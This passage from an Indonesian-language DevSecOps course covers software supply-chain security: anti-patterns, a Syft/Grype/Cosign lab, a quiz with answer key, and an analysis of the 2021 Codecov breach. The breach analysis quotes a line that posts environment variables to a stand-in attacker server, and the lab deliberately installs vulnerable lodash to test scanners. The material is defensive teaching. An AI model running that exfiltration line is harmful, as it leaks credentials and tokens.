    *   *Dampak:* Pemindai SCA konvensional yang hanya memeriksa paket sistem operasi (`apk`, `dpkg`) akan melaporkan nol dependensi (bersih semu), padahal biner statis tersebut mengompilasi pustaka rentan di dalamnya. Syft harus dikonfigurasi untuk memeriksa simbol binari secara heuristik.

---

## 14. Anti-Patterns & Common Vulnerabilities

### Anti-Pattern 1: Mengabaikan Dependensi Pengembangan di Lingkungan Produksi
*   **Praktik Buruk:** Mengikutsertakan seluruh `devDependencies` (pada Node.js) atau test suites (pada Python) ke dalam citra akhir produksi.
*   **Dampak:** Memperbesar ukuran citra kontainer secara masif dan memperluas *attack surface*. Perkakas debugging pihak ketiga yang terbawa ke kontainer seringkali memiliki kerentanan parah yang dapat dieksploitasi oleh penyerang untuk eskalasi hak istimewa.
*   **Remediasi:** Gunakan multi-stage build; pastikan hanya pustaka *production-only* (`npm prune --production` atau `pip install --no-dev`) yang disalin ke lapisan runtime akhir.

### Anti-Pattern 2: Penandatanganan Berbasis Tag Kontainer yang Dapat Berubah (*Mutable Tags*)
*   **Praktik Buruk:** Menandatangani citra kontainer menggunakan tag seperti `my-app:latest` atau `my-app:v1.0.0`.
*   **Dampak:** Tag kontainer dapat ditimpa (*re-tagged*) di repositori OCI kapan saja. Penyerang yang memiliki akses repositori dapat mengganti citra yang ditunjuk oleh tag tersebut tanpa membatalkan tanda tangan aslinya jika kontrol validasi tidak diikat ke digest kriptografis.
*   **Remediasi:** Selalu tandatangani dan verifikasi artefak kontainer menggunakan **Digest SHA-256 yang Immutable** (`my-app@sha256:7f...`).

### Anti-Pattern 3: Menggunakan Private Key Statis yang Disimpan di GitHub Secrets
*   **Praktik Buruk:** Mengekspor kunci privat Cosign atau GPG dan menyimpannya di variabel repositori (`${{ secrets.COSIGN_PRIVATE_KEY }}`).
*   **Dampak:** Jika alur kerja CI/CD dieksploitasi via injeksi perintah (*command injection*) pada Pull Request pihak ketiga, nilai variabel rahasia ini dapat dicuri, memungkinkan penyerang menandatangani malware secara sah atas nama perusahaan.
*   **Remediasi:** Tinggalkan kunci statis. Terapkan arsitektur *Keyless Signing* menggunakan penyedia identitas OIDC dan Sigstore Fulcio.

---

## 15. Best Practices & Enterprise Remediation Guide

1.  **Penerapan SLSA Build L3:** Pastikan pipeline CI/CD dieksekusi di runner sementara (*ephemeral*), terisolasi secara jaringan dari intervensi manual, dan menghasilkan data *provenance* non-falsifiable yang memetakan sumber commit langsung ke biner akhir.
2.  **Pemindaian Berkelanjutan Pasca-Rilis (*Continuous Vulnerability Monitoring*):**
    *   Jangan hanya memindai dependensi saat proses *build*. Kerentanan zero-day baru dipublikasikan setiap hari untuk komponen lama yang sudah berjalan di produksi.
    *   Simpan file SBOM setiap rilis di repositori terpusat. Gunakan sistem pemindai berkala yang memindai file SBOM statis tersebut setiap 24 jam sekali terhadap database CVE terbaru tanpa perlu membangun ulang citra kontainer.
3.  **Kebijakan Evaluasi Lisensi Korporat:**
    *   Tentukan taksonomi lisensi yang jelas:
        *   *Approved (Whitelisted):* MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC.
        *   *Conditional Review:* LGPL-2.1, LGPL-3.0, MPL-2.0 (memerlukan tinjauan tim legal arsitektur).
        *   *Strictly Forbidden (Blacklisted):* GPL-2.0, GPL-3.0, AGPL-3.0, SSPL, BSL.
    *   Otomatisasikan penegakan kebijakan ini secara terprogram di pipeline CI/CD sebelum artefak diizinkan masuk ke tahap kompilasi lanjutan.

---

## 16. Hands-on Lab Step-by-Step

Lab ini akan memandu Anda secara teknis melalui seluruh siklus pengamanan rantai pasok perangkat lunak: membuat aplikasi, mengekstrak SBOM, mengaudit dependensi, menandatangani artefak secara kriptografis, dan memvalidasi keabsahannya.

### Langkah 1: Persiapan Lingkungan & Pemasangan Perkakas
Jalankan perintah berikut di lingkungan Linux / macOS Anda untuk memastikan seluruh CLI terpasang:

```bash
# Buat direktori kerja terisolasi
mkdir -p ~/supply-chain-lab && cd ~/supply-chain-lab

# Unduh dan pasang Syft (SBOM generator)
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sudo sh -s -- -b /usr/local/bin

# Unduh dan pasang Grype (SCA Vulnerability scanner)
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sudo sh -s -- -b /usr/local/bin

# Unduh dan pasang Cosign (Sigstore Signer)
COSIGN_VERSION="v2.2.3"
curl -sLO "https://github.com/sigstore/cosign/releases/download/${COSIGN_VERSION}/cosign-linux-amd64"
sudo install cosign-linux-amd64 /usr/local/bin/cosign
rm cosign-linux-amd64

# Verifikasi pemasangan seluruh komponen
syft version
grype version
cosign version
```

### Langkah 2: Pembuatan Aplikasi & Dockerfile Bertingkat
Buat basis kode sederhana berbasis Node.js yang menyertakan dependensi dengan kerentanan yang diketahui untuk tujuan validasi pemindai:

```bash
# Inisialisasi manifest package.json dengan pustaka rentan (lodash 4.17.15)
cat << 'EOF' > package.json
{
  "name": "vulnerable-app",
  "version": "1.0.0",
  "description": "Lab Supply Chain Security",
  "main": "index.js",
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "4.17.15"
  }
}
EOF

# Buat kode server minimal
cat << 'EOF' > index.js
const express = require('express');
const _ = require('lodash');
const app = express();

app.get('/', (req, res) => {
  res.send(_.escape('Lab Supply Chain Active'));
});

app.listen(3000, () => console.log('Listening on port 3000'));
EOF

# Buat Dockerfile OCI
cat << 'EOF' > Dockerfile
FROM node:18-alpine
WORKDIR /usr/src/app
COPY package.json ./
RUN npm install --only=production
COPY index.js ./
USER node
EXPOSE 3000
CMD ["node", "index.js"]
EOF

# Bangun citra kontainer
docker build -t ttl.sh/devsecops-lab-app:1h .
```

### Langkah 3: Ekstraksi & Inspeksi SBOM
Hasilkan representasi SBOM dalam format SPDX dan CycloneDX, kemudian kaji isinya:

```bash
# Ekstraksi ke format CycloneDX JSON
syft packages ttl.sh/devsecops-lab-app:1h -o cyclonedx-json=cyclonedx.json

# Ekstraksi ke format SPDX JSON
syft packages ttl.sh/devsecops-lab-app:1h -o spdx-json=spdx.json

# Analisis struktur komponen lodash di dalam SBOM CycloneDX
jq '.components[] | select(.name=="lodash")' cyclonedx.json
```

Output yang diharapkan menampilkan data metadata terstruktur:
```json
{
  "name": "lodash",
  "version": "4.17.15",
  "purl": "pkg:npm/lodash@4.17.15",
  "type": "library"
}
```

### Langkah 4: Pemindaian Kerentanan SCA Berdasarkan SBOM
Jalankan analisis kerentanan Grype langsung terhadap file manifes SBOM yang telah dihasilkan:

```bash
# Pindai file SBOM terhadap database kerentanan
grype sbom:./cyclonedx.json
```

Output pemindai akan mendeteksi kerentanan prototype pollution pada lodash versi 4.17.15:
```
NAME    INSTALLED  FIXED-IN  TYPE  VULNERABILITY        SEVERITY 
lodash  4.17.15    4.17.21   npm   CVE-2020-8203        High     
lodash  4.17.15    4.17.21   npm   GHSA-p6mc-m468-83gw  High     
lodash  4.17.15    4.17.21   npm   CVE-2021-23337       High     
```

### Langkah 5: Penerbitan Citra ke OCI Registry Terbuka (ttl.sh)
Unggah citra kontainer ke registry publik sementara (*ephemeral registry* `ttl.sh` yang tidak memerlukan autentikasi):

```bash
docker push ttl.sh/devsecops-lab-app:1h

# Dapatkan Digest SHA256 Citra Kontainer yang telah diunggah
IMAGE_DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' ttl.sh/devsecops-lab-app:1h)
echo "Target digest: ${IMAGE_DIGEST}"
```

### Langkah 6: Penandatanganan Kriptografis Kunci Lokal dengan Cosign
Untuk mendemonstrasikan mekanika kriptografi di workstation lokal, buat pasangan kunci kriptografis dan tandatangani citra kontainer:

```bash
# Hasilkan pasangan kunci lokal (masukkan passphrase sederhana, misal: 'password123')
cosign generate-key-pair

# Tandatangani citra kontainer menggunakan kunci privat
cosign sign --key cosign.key "${IMAGE_DIGEST}"

# Pasang dokumen SBOM sebagai Attestation terenkripsi
cosign attest --key cosign.key \
  --predicate ./cyclonedx.json \
  --type cyclonedx \
  "${IMAGE_DIGEST}"
```

### Langkah 7: Verifikasi Tanda Tangan dan Integritas Dokumen
Lakukan proses verifikasi integritas citra kontainer dan keabsahan atestasi:

```bash
# 1. Verifikasi Signature Kontainer
cosign verify --key cosign.pub "${IMAGE_DIGEST}"

# 2. Verifikasi dan Tampilkan Predicate SBOM Attestation dari Registry
cosign verify-attestation --key cosign.pub --type cyclonedx "${IMAGE_DIGEST}" | jq '.payload | @base64d | fromjson'
```

Jika output JSON dari payload atestasi berhasil terurai, integritas rantai pasok citra kontainer Anda dari fase kode hingga penyimpanan repositori telah terbukti sah secara matematis.

---

## 17. Real-World Case Study & Incident Analysis Enterprise

### Kasus: Insiden Infiltrasi Bash Uploader Codecov (2021)

#### 1. Ringkasan Insiden
Codecov adalah platform analisis cakupan kode (*code coverage*) terkemuka yang digunakan ribuan perusahaan skala besar. Pada awal tahun 2021, aktor ancaman berhasil menyusup ke lingkungan produksi Codecov akibat kredensial akun Google Cloud yang terekspos di dalam citra Docker publik perusahaan. 

#### 2. Mekanika Serangan (Attack Flow)
1.  Penyerang menggunakan kredensial yang bocor untuk memodifikasi skrip bash uploader resmi milik Codecov (`https://codecov.io/bash`) yang disimpan di bucket Google Cloud Storage.
2.  Penyerang menyisipkan baris kode berbahaya berupa ekstraktor rahasia (*credential harvester*):
    ```bash
    # Skrip berbahaya yang diinjeksi penyerang:
    curl -sm 0.5 -d "$env" https://attacker-c2-server.com/upload || true
    ```
3.  Setiap kali pipeline CI/CD milik ribuan pelanggan hilir mengeksekusi skrip uploader resmi tersebut saat pengujian kode, skrip diam-diam mengumpulkan seluruh variabel lingkungan runner (termasuk token akses Git, kunci privat AWS, dan kredensial database produksi) lalu mengekspatriasinya ke server C2 milik penyerang.

#### 3. Titik Kegagalan Arsitektur
*   **Ketiadaan Validasi Integritas Kriptografis:** Skrip bash uploader diunduh langsung via `curl | bash` di ribuan runner CI tanpa memverifikasi hash SHA-256 statis ataupun tanda tangan digital.
*   **Runner Environment Eksfiltrasi Terbuka:** Runner CI/CD memiliki akses jaringan keluar (*egress network*) tanpa batas ke internet, memungkinkan pengiriman rahasia ke domain yang tidak dikenal.
*   **Ketiadaan Provenance & SLSA Enforcement:** Pihak pengembang hilir mempercayai artefak hanya berdasarkan protokol transit (HTTPS) tanpa mengaudit asal usul (*provenance*) build.

#### 4. Mitigasi dengan Standar SLSA & Sigstore
Jika pelanggan Codecov saat itu telah menerapkan kontrol rantai pasok modern:
*   Skrip dan utilitas build pihak ketiga wajib memiliki atestasi In-Toto dan diverifikasi tanda tangan integritasnya via Cosign sebelum dieksekusi di runner.
*   Implementasi SLSA L3 builder akan menjamin bahwa skrip dieksekusi di lingkungan *hermetic* di mana akses egress dibatasi secara ketat hanya ke domain internal yang terdaftar.

---

## 18. Quiz Pemahaman & Challenge

### Soal Evaluasi Konseptual

#### Pertanyaan 1
Mengapa pendekatan *Keyless Signing* pada Sigstore (Cosign + Fulcio + Rekor) dianggap lebih aman daripada menyimpan kunci privat statis di dalam sistem CI/CD Secrets (seperti GitHub Repository Secrets)?
*   A. Karena Sigstore mengenkripsi seluruh file biner menggunakan algoritma simetris AES-256.
*   B. Karena kunci privat hanya dibuat sementara di memori dan langsung dimusnahkan, sehingga menghilangkan risiko kebocoran kunci jangka panjang dari variabel environment runner.
*   C. Karena Sigstore memindahkan tanggung jawab penandatanganan ke penyedia cloud container registry.
*   D. Karena Fulcio tidak memerlukan OIDC token untuk menerbitkan sertifikat publik.

#### Pertanyaan 2
Pada arsitektur In-Toto Attestation, apakah peran utama dari komponen yang disebut *Predicate*?
*   A. Menyimpan daftar akun pengguna yang memiliki izin untuk menjalankan kontainer.
*   B. Menjadi pengidentifikasi unik dari citra kontainer berbasis SHA-256 digest.
*   C. Berisi konten klaim atau fakta terperinci yang dibuat oleh pipeline (misalnya build provenance SLSA atau manifes SBOM).
*   D. Berfungsi sebagai algoritma enkripsi untuk menyembunyikan identitas pengembang.

#### Pertanyaan 3
Dalam format SBOM, apa perbedaan mendasar antara spesifikasi CycloneDX dan SPDX?
*   A. SPDX tidak mendukung format JSON, sedangkan CycloneDX eksklusif JSON.
*   B. SPDX fokus pada standardisasi internasional dan kepatuhan lisensi legal, sedangkan CycloneDX dirancang secara native oleh OWASP untuk kasus keamanan siber dan VEX.
*   C. CycloneDX hanya dapat memindai dependensi bahasa pemrograman Go dan Rust.
*   D. SPDX secara otomatis menghapus kerentanan berkategori CRITICAL dari hasil pemindaian.

#### Pertanyaan 4
Bagaimana cara mesin pemindai SCA seperti Syft mendeteksi dependensi dari citra kontainer yang berbasis biner terkompilasi statis (seperti Go binary) di mana tidak ada file `package.json` atau package manager OS?
*   A. Dengan memodifikasi kode biner aplikasi saat kontainer berjalan.
*   B. Melalui analisis heuristik struktur file biner dan parsing metadata DWARF/symbol tables yang tertanam di dalam biner tersebut.
*   C. Menghubungi repositori GitHub asli dari aplikasi secara otomatis melalui reverse DNS.
*   D. Mengabaikan biner tersebut karena SCA hanya dapat memindai file teks.

#### Pertanyaan 5
Sebuah pipeline CI/CD memindai SBOM menggunakan Grype dan menemukan kerentanan `CVE-2023-XXXX` dengan tingkat keparahan HIGH pada pustaka transitif. Namun, tim arsitektur menyatakan bahwa fungsi dari pustaka yang rentan tersebut tidak pernah dipanggil oleh kode aplikasi. Dokumen apa yang harus diterbitkan untuk menyatakan status ini secara formal tanpa menurunkan ambang batas keamanan?
*   A. Dokumen RFC-3161.
*   B. Dokumen VEX (*Vulnerability Exploitability eXchange*) dengan status `not_affected`.
*   C. Dokumen X.509 Certificate Revocation List (CRL).
*   D. Dokumen In-Toto Root Layout.

---

### Kunci Jawaban
1.  **B** – Sigstore Keyless memanfaatkan sertifikat x509 jangka pendek berbasis identitas OIDC; kunci privat dimusnahkan segera setelah tanda tangan dicatat di Rekor transparency log.
2.  **C** – Dalam skema In-Toto, *Subject* adalah artefak perangkat lunak, sedangkan *Predicate* adalah dokumen pernyataan atau metadata (misal: SBOM atau SLSA provenance) yang dilekatkan padanya.
3.  **B** – SPDX (ISO standard) memiliki keunggulan historis pada audit kepatuhan lisensi, sementara CycloneDX dikembangkan oleh OWASP dengan fokus mendalam pada keamanan aplikasi dan analisis kerentanan.
4.  **B** – Syft membongkar biner terkompilasi dan membaca symbol table serta metadata dependensi yang disematkan oleh compiler Go/Rust ke dalam biner.
5.  **B** – VEX memungkinkan penyedia perangkat lunak secara formal menyatakan bahwa produk mereka tidak terdampak oleh kerentanan tertentu meskipun pustaka tersebut terdeteksi di dalam SBOM.

---

### Scenario-Based Practical Challenge: "The Broken Admission Gate"

#### Deskripsi Skenario:
Sebuah kluster Kubernetes pementasan (*staging*) mengonfigurasi Admission Controller untuk memverifikasi tanda tangan citra kontainer sebelum Pod diizinkan berjalan. Namun, tim pengembang melaporkan bahwa seluruh perilisan terhenti dengan galat:
`denied the request: image verification failed: no valid signatures found`.

#### Investigasi Awal:
Pipeline GitHub Actions berhasil membangun dan menandatangani citra kontainer dengan Cosign menggunakan perintah:
`cosign sign --yes ghcr.io/my-org/core-service:v2.1.0`

Namun, manifes Deployment Kubernetes yang dikirimkan oleh pipeline CD adalah:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: core-service
spec:
  replicas: 1
  template:
    spec:
      containers:
      - name: core-service
        image: ghcr.io/my-org/core-service:v2.1.0
```

#### Tugas Anda:
1.  Identifikasi akar masalah arsitektural mengapa Admission Controller gagal memverifikasi tanda tangan meskipun perintah `cosign sign` sukses di CI.
2.  Tuliskan modifikasi konfigurasi pipeline dan perbaikan manifes Kubernetes agar verifikasi tanda tangan deterministik dan lolos dari validasi Admission Controller.

#### Solusi Challenge:
*   **Akar Masalah:** Tim pengembang menandatangani dan mendeploy kontainer menggunakan referensi tag yang dapat berubah (`:v2.1.0`). Cosign mengunggah metadata tanda tangan yang terikat pada *Digest SHA-256 spesifik* dari citra saat itu. Namun, jika Admission Controller menginspeksi image tag, registry dapat mengembalikan digest yang berbeda akibat *race condition* atau tag mutability. Selain itu, best-practice keamanan mengharuskan verifikasi berbasis Digest, bukan Tag.
*   **Perbaikan Manifes & Pipeline:** Pipeline CI harus mengekstrak digest unik dari proses build (`sha256:4a8c...`) dan memperbarui manifes Kubernetes Deployment untuk secara eksplisit menunjuk digest tersebut:
    ```yaml
    containers:
    - name: core-service
      image: ghcr.io/my-org/core-service@sha256:4a8c9b2e6fd4e0f52b75a40b991b17a78484a0d92383c27634f19d08e1c6b1a2
    ```
    Penandatanganan di CI harus diubah menjadi:
    ```bash
    cosign sign --yes ghcr.io/my-org/core-service@sha256:4a8c9b2e...
    ```
    Dengan mengikat deployment langsung ke SHA-256 Digest, Admission Controller dapat melakukan resolusi kriptografis ke Rekor secara deterministik dan mengizinkan peluncuran Pod.

---

## 19. Summary & Key Takeaways

1.  **Software Bill of Materials (SBOM)** bukan sekadar file inventaris statis, melainkan fondasi utama visibilitas rantai pasok. Format standar seperti SPDX dan CycloneDX memungkinkan otomasi pelacakan dependensi dari hulu ke hilir.
2.  **Software Composition Analysis (SCA)** harus diintegrasikan di berbagai gerbang pipeline dengan kriteria evaluasi ganda: identifikasi kerentanan keamanan (CVE/GHSA) dan kepatuhan hukum terhadap lisensi sumber terbuka.
3.  **Paradigma Keyless Signing** melalui ekosistem Sigstore merevolusi penandatanganan artefak dengan menghapus risiko fatal kebocoran kunci privat statis, mengalihkan jangkar kepercayaan ke identitas OIDC dan buku besar transparansi publik Rekor.
4.  **Atestasi Kriptografis (In-Toto)** menyediakan bukti otentik mengenai asal-usul build (*provenance*), menjamin bahwa artefak yang berjalan di lingkungan produksi benar-benar merupakan artefak yang dibangun oleh sistem CI resmi dari kode sumber yang telah ditinjau.
5.  **Keamanan Rantai Pasok Berkelanjutan** membutuhkan kontrol izin (*admission control*) di runtime kluster untuk memverifikasi tanda tangan dan kelengkapan atestasi sebelum kode diberikan izin untuk dieksekusi.

---

## 20. Referensi Resmi & Standar Keamanan

*   **NIST SP 800-218:** *Secure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities.*
    *   URL: https://csrc.nist.gov/publications/detail/sp/800-218/final
*   **SLSA Framework:** *Supply-chain Levels for Software Artifacts Specification v1.0.*
    *   URL: https://slsa.dev/spec/v1.0/
*   **OWASP Software Component Verification Standard (SCVS):**
    *   URL: https://owasp.org/www-project-software-component-verification-standard/
*   **Sigstore Documentation:** *Cosign, Fulcio, and Rekor Architecture Guides.*
    *   URL: https://docs.sigstore.dev/
*   **In-Toto Project Specification:** *A Framework to Secure the Integrity of Software Supply Chains.*
    *   URL: https://in-toto.io/
*   **CycloneDX Specification:** *OWASP CycloneDX Bill of Materials Standard.*
    *   URL: https://cyclonedx.org/
*   **SPDX Standard (ISO/IEC 5962:2021):** *Information technology — System and software engineering — Software Package Data Exchange (SPDX®) Specification.*
    *   URL: https://spdx.dev/